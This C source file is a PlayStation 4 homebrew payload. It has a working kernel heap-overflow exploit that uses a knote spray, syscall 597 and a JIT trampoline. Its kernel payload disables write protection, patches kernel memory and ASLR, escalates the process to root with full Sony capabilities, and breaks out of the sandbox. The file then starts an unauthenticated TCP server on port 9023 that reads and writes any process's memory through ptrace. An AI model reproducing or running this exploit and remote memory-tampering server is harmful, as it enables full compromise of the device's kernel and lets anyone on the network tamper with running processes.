/*
	Generic PS4API Payload written by Black Panther/AlmightySo. 
	THANK YOU TO THE FOLLOWING IN NO ORDER: 2much4u, Bad ChoicesZ, CTurt, qwertyoruiop, kr105rlz, Z80, and Zecaxco
*/

#include "ps4.h"
#include <inttypes.h>
//#include <unistd.h>

#define CTL_KERN 1
#define KERN_PROC 14
#define KERN_PROC_PID 1

typedef int bool;

#define TRUE 1
#define FALSE 0


#define DEBUG_SOCKET

#include "defines.h"

//Variables used in the server code/processFinding code
static int sock;
static void *dump;

int svLength;


//Thanks to BadChoicesZ
int (*sceSysUtilSendSystemNotificationWithText)(int messageType, int userID, char* message);

void notify(char *message) {
	char buffer[512];
	sprintf(buffer, "%s\n\n\n\n\n\n\n", message);
	sceSysUtilSendSystemNotificationWithText(36, 0x10000000, buffer);
}


//To kr105rlz and CTURT for the jailbreak :)
void payload(struct knote *kn) {
	struct thread *td;
	struct ucred *cred;

	// Get td pointer
	asm volatile("mov %0, %%gs:0" : "=r"(td));

	// Enable UART output
	uint16_t *securityflags = (uint16_t*)0xFFFFFFFF833242F6;
	*securityflags = *securityflags & ~(1 << 15); // bootparam_disable_console_output = 0

	// Print test message to the UART line
	printfkernel("\n\n\n\n\n\n\n\n\nHello from kernel :-)\n\n\n\n\n\n\n\n\n");
	
	// Disable write protection
	uint64_t cr0 = readCr0();
	writeCr0(cr0 & ~X86_CR0_WP);
	
	// sysctl_machdep_rcmgr_debug_menu and sysctl_machdep_rcmgr_store_moe
	*(uint16_t *)0xFFFFFFFF82607C46 = 0x9090;
	*(uint16_t *)0xFFFFFFFF82607826 = 0x9090;
	
	*(char *)0xFFFFFFFF8332431A = 1;
	*(char *)0xFFFFFFFF83324338 = 1;
	//Patch ASLR and spoof firmware version string
	*(uint16_t *)0xFFFFFFFF82649C9C = 0x63EB;
	*(uint64_t*)0xFFFFFFFF8323A4E0 = 0x6660001;
	// Restore write protection
	writeCr0(cr0);
	
	// Resolve creds
	cred = td->td_proc->p_ucred;

	// Escalate process to root
	cred->cr_uid = 0;
	cred->cr_ruid = 0;
	cred->cr_rgid = 0;
	cred->cr_groups[0] = 0;

	void *td_ucred = *(void **)(((char *)td) + 304); // p_ucred == td_ucred
	
	// sceSblACMgrIsSystemUcred
	uint64_t *sonyCred = (uint64_t *)(((char *)td_ucred) + 96);
	*sonyCred = 0xffffffffffffffff;
	
	// sceSblACMgrGetDeviceAccessType
	uint64_t *sceProcType = (uint64_t *)(((char *)td_ucred) + 88);
	*sceProcType = 0x3801000000000013; // Max access
	
	// sceSblACMgrHasSceProcessCapability
	uint64_t *sceProcCap = (uint64_t *)(((char *)td_ucred) + 104);
	*sceProcCap = 0xffffffffffffffff; // Sce Process
	
	((uint64_t *)0xFFFFFFFF832CC2E8)[0] = 0x123456; //priv_check_cred bypass with suser_enabled=true
	((uint64_t *)0xFFFFFFFF8323DA18)[0] = 0; // bypass priv_check

	// Jailbreak ;)
	cred->cr_prison = (void *)0xFFFFFFFF83237250; //&prison0

	// Break out of the sandbox
	void *td_fdp = *(void **)(((char *)td->td_proc) + 72);
	uint64_t *td_fdp_fd_rdir = (uint64_t *)(((char *)td_fdp) + 24);
	uint64_t *td_fdp_fd_jdir = (uint64_t *)(((char *)td_fdp) + 32);
	uint64_t *rootvnode = (uint64_t *)0xFFFFFFFF832EF920;
	*td_fdp_fd_rdir = *rootvnode;
	*td_fdp_fd_jdir = *rootvnode;
			//Patch ASLR
	

}

// Perform kernel allocation aligned to 0x800 bytes
int kernelAllocation(size_t size, int fd) {
	SceKernelEqueue queue = 0;
	sceKernelCreateEqueue(&queue, "kexec");

	sceKernelAddReadEvent(queue, fd, 0, NULL);

	return queue;
}

void kernelFree(int allocation) {
	close(allocation);
}
void *exploitThread(void *none) {
	//printfsocket("[+] Entered exploitThread\n");

	uint64_t bufferSize = 0x8000;
	uint64_t overflowSize = 0x8000;
	uint64_t copySize = bufferSize + overflowSize;
	
	// Round up to nearest multiple of PAGE_SIZE
	uint64_t mappingSize = (copySize + PAGE_SIZE - 1) & ~(PAGE_SIZE - 1);
	
	uint8_t *mapping = mmap(NULL, mappingSize + PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
	munmap(mapping + mappingSize, PAGE_SIZE);
	
	uint8_t *buffer = mapping + mappingSize - copySize;
	
	int64_t count = (0x100000000 + bufferSize) / 4;

	// Create structures
	struct knote kn;
	struct filterops fo;
	struct knote **overflow = (struct knote **)(buffer + bufferSize);
	overflow[2] = &kn;
	kn.kn_fop = &fo;

	// Setup trampoline to gracefully return to the calling thread
	void *trampw = NULL;
	void *trampe = NULL;
	int executableHandle;
	int writableHandle;
	uint8_t trampolinecode[] = {
		0x58, // pop rax
		0x48, 0xB8, 0x19, 0x39, 0x40, 0x82, 0xFF, 0xFF, 0xFF, 0xFF, // movabs rax, 0xffffffff82403919
		0x50, // push rax
		0x48, 0xB8, 0xBE, 0xBA, 0xAD, 0xDE, 0xDE, 0xC0, 0xAD, 0xDE, // movabs rax, 0xdeadc0dedeadbabe
		0xFF, 0xE0 // jmp rax
	};

	// Get Jit memory
	sceKernelJitCreateSharedMemory(0, PAGE_SIZE, PROT_CPU_READ | PROT_CPU_WRITE | PROT_CPU_EXEC, &executableHandle);
	sceKernelJitCreateAliasOfSharedMemory(executableHandle, PROT_CPU_READ | PROT_CPU_WRITE, &writableHandle);

	// Map r+w & r+e
	trampe = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_EXEC, MAP_SHARED, executableHandle, 0);
	trampw = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_TYPE, writableHandle, 0);

	// Copy trampoline to allocated address
	memcpy(trampw, trampolinecode, sizeof(trampolinecode));	
	*(void **)(trampw + 14) = (void *)payload;

	// Call trampoline when overflown
	fo.f_detach = trampe;

	// Start the exploit
	int sockets[0x2000];
	int allocation[50], m = 0, m2 = 0;
	int fd = (bufferSize - 0x800) / 8;

	//printfsocket("[+] Creating %d sockets\n", fd);

	// Create sockets
	for(int i = 0; i < 0x2000; i++) {
		sockets[i] = sceNetSocket("sss", AF_INET, SOCK_STREAM, 0);
		if(sockets[i] >= fd) {
			sockets[i + 1] = -1;
			break;
		}
	}

	// Spray the heap
	for(int i = 0; i < 50; i++) {
		allocation[i] = kernelAllocation(bufferSize, fd);
		//printfsocket("[+] allocation = %llp\n", allocation[i]);
	}

	// Create hole for the system call's allocation
	m = kernelAllocation(bufferSize, fd);
	m2 = kernelAllocation(bufferSize, fd);
	kernelFree(m);

	// Perform the overflow
	int result = syscall(597, 1, mapping, &count);
	//printfsocket("[+] Result: %d\n", result);

	// Execute the payload
	//printfsocket("[+] Freeing m2\n");
	kernelFree(m2);
	
	// Close sockets
	for(int i = 0; i < 0x2000; i++) {
		if(sockets[i] == -1)
			break;
		sceNetSocketClose(sockets[i]);
	}
	
	// Free allocations
	for(int i = 0; i < 50; i++) {
		kernelFree(allocation[i]);
	}


	
	// Free the mapping
	munmap(mapping, mappingSize);
	
	return NULL;
}


int getPIDFPN(int i,char*target)
{
	
	int pid, mib[4],ret;
	size_t len;
	int j;
	void *aux;
	void *dump;

	mib[0] = CTL_KERN;
	mib[1] = KERN_PROC;
	mib[2] = KERN_PROC_PID;
	mib[3] = i;

	if(sysctl(mib, 4, NULL, &len, NULL, 0) == -1)
	{
		ret = -1;
	}
	if(len > 0) 
	{
		dump=malloc(len);
		aux=dump;
		if(sysctl(mib, 4, dump, &len, NULL, 0) == -1) 
		{
			ret = -1;
		}
		else 
		{
			char * name = dump + 0x1bf;
			char * thread = dump + 0x18a;
			free(aux);
			sceKernelSleep(.1);
			if(strcmp(name,target) == 0)
				return ret = i;
			else ret = -1;
		}
	
	}
	return ret;
}

int getProcID(char * target)
{
	for(int i = 0; i < 500; i++)
	{
		if(getPIDFPN(i,target) == i)
			return i;
	}
}

//Below is basic PTRACE functions, this is for very basic testing only, will remove and properly add in later...

int PTRACE(int req, int pid, void * argsAddr, int data)
{
	int ret = syscall(26, req, pid, argsAddr, data);
	if(ret == 0)
		return ret;
	else PTRACE(req, pid, argsAddr, data);
}

int procAttach(int pid)
{
	int ret = PTRACE(PT_ATTACH, pid, NULL, NULL);
	if(ret != 0)
		PTRACE(PT_ATTACH, pid, NULL, NULL);
	int stat = 0;
	syscall(7, pid, &stat, WUNTRACED, 0);
	return ret;
}

int procDetach(int pid)
{
	int ret = PTRACE(PT_DETACH, pid, NULL, NULL);
	if(ret != 0)
		PTRACE(PT_DETACH, pid, NULL, NULL);
	else return ret;
}

int procReadBytes(int pid, void * offset, void * buffer, int len)
{
	struct ptrace_io_desc pt_desc;
	pt_desc.piod_op = PIOD_READ_D;
	pt_desc.piod_addr = buffer;
	pt_desc.piod_offs = offset;
	pt_desc.piod_len = len;
	return PTRACE(PT_IO, pid, &pt_desc, NULL);
}

int procWriteBytes(int pid, void * offset, void * buffer, int len)
{
	struct ptrace_io_desc pt_desc;
	pt_desc.piod_op = PIOD_WRITE_D;
	pt_desc.piod_addr = buffer;
	pt_desc.piod_offs = offset;
	pt_desc.piod_len = len;
	return PTRACE(PT_IO, pid, &pt_desc, NULL);
}


char svBuffer[0x1000];

//Functions to send data to the client from the server
void SendInt16(int handle, short msg)
{
	char tmp[2];
	int * iPtr = &tmp;
	*iPtr = msg;
	sceNetSend(handle, (void*)iPtr, 2, 0);
}
void SendInt32(int handle, int msg)
{
	char tmp[4];

	int * iPtr = &tmp;

	*iPtr = msg;

	sceNetSend(handle, (void*)iPtr, 4, 0);
}
void SendInt64(int handle, long msg)
{
	char tmp[8];
	int * iPtr = &tmp;
	*iPtr = msg;
	sceNetSend(handle, (void*)iPtr, 8, 0);
}

void SendByte(int handle, char msg)
{
	char tmp[1];
	tmp[0] = msg;
	sceNetSend(handle, tmp, 1, 0);
}

void SendBytes(int handle, char * msg, int len)
{
	SendInt32(handle, len);
	sceNetSend(handle, msg, len, 0);
}

void SendString(int handle, const char * msg, int len)
{
	SendInt32(handle, len);
	SendBytes(handle, msg, len);
}



void * netThread(void * none)
{
	printfsocket("Hello from netThread :)\n");

	int svServer, svClient;

	struct sockaddr_in svServerAddress, svClientAddress;
	int svClientLength = sizeof(svClientAddress);

	svServer = sceNetSocket("coreyServer", AF_INET, SOCK_STREAM, 0);
	int flag = 0x1;

	sceNetSetsockopt(svServer, IPPROTO_TCP, TCP_NODELAY, (char *)&flag, sizeof(int));
	memset(&svServerAddress, 0, sizeof(svServerAddress));
	svServerAddress.sin_family = AF_INET;
	svServerAddress.sin_addr.s_addr = sceNetHtonl(IN_ADDR_ANY);
	svServerAddress.sin_port = sceNetHtons(9023);

	sceNetBind(svServer, (struct sockaddr *)&svServerAddress, sizeof(svServerAddress));

	sceNetListen(svServer, 128);

	printfsocket("[PS4SERVER] - Listening...\n");

	int aPID = 0;
	while(1)
	{
		svClient = sceNetAccept(svServer, (struct sockaddr * )&svClientAddress, &svClientLength);
		printfsocket("[PS4SERVER] - Client Connected...\n");
		while((svLength = sceNetRecvfrom(svClient, svBuffer, sizeof(svBuffer), 0, (struct sockaddr *)&svClientAddress, &svClientLength)))
		{
			if(svLength > 0)
			{
				printfsocket("[PS4SERVER] Command Size: %d\n", svLength);
				switch(svBuffer[4]) //Reads the fourth byte as this is where the command ID is stored. Too lazy to change it...
				{
					case 0x00:
						printfsocket("[PS4SERVER] : No Command\n");
					break;
					case 0x01:  //As you can see a lot of the commands are coded poorly. Could use some cleaning...
					{
						char buf[35];
						char ret[4];
						int i = 5;
						int x = 0;
						while(svBuffer[i] != '\0')
						{
							buf[x] = svBuffer[i];
							x++;
							i++;
						}
						buf[x] = '\0';
						int pid = getProcID(buf);
						aPID = pid;
						printfsocket("[PS4SERVER] getProcID(%s) = %d\n", buf, pid);

						int * iRet = &ret;

						*iRet = pid;

						sceNetSend(svClient, (void*)iRet, 4, 0);
					}
					break;
					case 0x02:
					{
						//Buffer to hold the bytes of the pid
						char buf[4];


						for(int i = 0; i < 4; i++)
							buf[i] = svBuffer[5 + i];

						int * iPtr = &buf;

						//Attach to the supplied pid
						int att = procAttach((int)*iPtr);

						printfsocket("Attach to %d returned %d\n", *iPtr, att);

						//Send the result from PTRACE(PT_ATTACH)
						sceNetSend(svClient, (void*)att, 4, 0);

					}
					break;
					case 0x03:
					{
						//BUffer to hold the bytes of the pid
						char buf[4];

						for(int i = 0; i < 4; i++)
							buf[i] = svBuffer[5 + i];

						int * iPtr = &buf;

						//Detach from the supplied pid
						int det = procDetach((int)*iPtr);

						printfsocket("Detach from %d returned %d\n", *iPtr, det);

						//Send the result from PTRACE(PT_DETACH)
						sceNetSend(svClient, (void*)det, 4, 0);

					}
					break;
					case 0x04:
					{
						//Buffers to store the bytes of the command arguments
						char pidBuf[4];
						char offBuf[4];
						char readBuf[4];

						//A loop to transfer the bytes from the command buffer to the argument buffers
						for(int i = 0; i < 4; i++)
						{
							pidBuf[i] = svBuffer[5 + i];
							offBuf[i] = svBuffer[9 + i];
							readBuf[i] = svBuffer[13 + i];
						}

						//Below is just storing the arguments in variables, and printing the values for debugging.

						int * pidPtr = &pidBuf;
						int pid = (int)*pidPtr; //Here it's just making a pointer to the value stored in the buffers and assigning it to the proper data type
						printfsocket("Pid = %d\n", pid);

						unsigned int * off = &offBuf;
						printfsocket("Offset = %lu\n", *off);

						int * readPtr = &readBuf;
						int readLen = (int)*readPtr;

						printfsocket("Read length: %d\n", readLen);

						char ret[readLen];

						printfsocket("Attempting to read %d bytes from %lu...\n", readLen, *off);

						//Attach, Read, Detach...
						procAttach(pid);
						procReadBytes(pid, (void*)*off, (void*)ret, readLen);
						procDetach(pid);

						//Send the read bytes to the client.
						SendBytes(svClient, ret, readLen);
					}
					break;
					case 0x05:
					{
						//Buffers to store the bytes of the command arguments
						char pidBuf[4];
						char offBuf[4];
						char dataBuf[4];

						//A loop to transfer the bytes from the command buffer to the argument buffers
						for(int i = 0; i < 4; i++)
						{
							pidBuf[i] = svBuffer[5 + i];
							offBuf[i] = svBuffer[9 + i];
							dataBuf[i] = svBuffer[13 + i];
						}

						//Below is just storing the arguments in variables, and printing the values for debugging.
						int * pidPtr = &pidBuf;
						int pid = (int)*pidPtr;
						printfsocket("Pid = %d\n", pid);

						unsigned int * off = &offBuf;
						printfsocket("Offset = %lu\n", *off);

						int * dataPtr = &dataBuf;
						int dataLen = (int)*dataPtr;
						printfsocket("Read length: %d\n", dataLen);

						char writeData[dataLen];

						//Populate the writeData array with the data that is to be written...
						for(int i = 0; i < dataLen; i++)
							writeData[i] = svBuffer[17 + i];

						printfsocket("Attempting to write %d bytes to %lu...\n", dataLen, *off);

						//Attach, Write, Detach
						procAttach(pid);
						procWriteBytes(pid, (void*)*off, (void*)writeData, dataLen);
						procDetach(pid);

						printfsocket("Successfully wrote memory\n");

					}
					break;
					case 0x06: //VSH Notify a message
					{
						char msgLenBuf[4];


						for(int i = 0; i < 4; i++)
							msgLenBuf[i] = svBuffer[5 + i];

						int * msgPtr = &msgLenBuf;
						int msgLen = (int)*msgPtr;

						char msg[msgLen];

						for(int i = 0; i < msgLen; i++)
							msg[i] = svBuffer[9 + i];

						notify(msg);
						printfsocket("Notified: %s\n", msg);

					}
					break;
					case 0x66: //This command ID was used just to test functions, etc. Left here in order to test more functions, etc.
					{
						notify("Test Command...");
					}
					break;
					default:
						printfsocket("[PS4SERVER] : No Command\n");
					break;
				}
				//Clean the buffer as to not supply the wrong bytes to the wrong command, etc.
				memset(svBuffer, 0, sizeof(svBuffer));
			}
		}
		sceNetSocketClose(svClient);
		printfsocket("[PS4SERVER] Client Disconnected...\n");
	}

}



int _main(void) {
	ScePthread thread;
	ScePthread netth;

	initKernel();	
	initLibc();
	initNetwork();
	initJIT();
	initPthread();

	//Thanks again BAdCHoicez and 2much4u
	int module;
	loadModule("libSceSysUtil.sprx", &module);
	RESOLVE(module, sceSysUtilSendSystemNotificationWithText);

	struct sockaddr_in server;

	server.sin_len = sizeof(server);
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = IP(192, 168, 137, 1);
	server.sin_port = sceNetHtons(9023);
	memset(server.sin_zero, 0, sizeof(server.sin_zero));
	sock = sceNetSocket("debug", AF_INET, SOCK_STREAM, 0);
	sceNetConnect(sock, (struct sockaddr *)&server, sizeof(server));
	
	int flag = 1;
	sceNetSetsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (char *)&flag, sizeof(int));
	
	dump = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);

	// Create exploit thread
	if(scePthreadCreate(&thread, NULL, exploitThread, NULL, "exploitThread") != 0) {
		printfsocket("[-] pthread_create error\n");
		return 0;
	}

	if(scePthreadCreate(&netth, NULL, netThread, NULL, "netThread") != 0)
	{
		printfsocket("[-]pthread_create error in netThread\n");
		return 0;
	}
	// Wait for thread to exit
	scePthreadJoin(thread, NULL);
	printfsocket("[+] PS4API V1.00 by **Black Panther** Loaded Successfully\n\n");
	printfsocket("[+] Kernel Exploited and ASLR Patched w/ success! \n");
	printfsocket("[+] Firmware Spoofed to 6.66\n");

	// Enable debug menu
	int (*sysctlbyname)(const char *name, void *oldp, size_t *oldlenp, const void *newp, size_t newlen) = NULL;
	RESOLVE(libKernelHandle, sysctlbyname);
	
	uint32_t enable;
	size_t size;
	
	enable = 1;
	size = sizeof(enable);
	
	sysctlbyname("machdep.rcmgr_utoken_store_mode", NULL, NULL, &enable, size);
	sysctlbyname("machdep.rcmgr_debug_menu", NULL, NULL, &enable, size);


	munmap(dump, PAGE_SIZE);	

	if(getuid() != 0) {
		printfsocket("[-] Kernel patch failed!\n");
		sceNetSocketClose(sock);
		return 1;
	}
	scePthreadJoin(netth, NULL);

	sceNetSocketClose(sock);
	
	return 0;
}
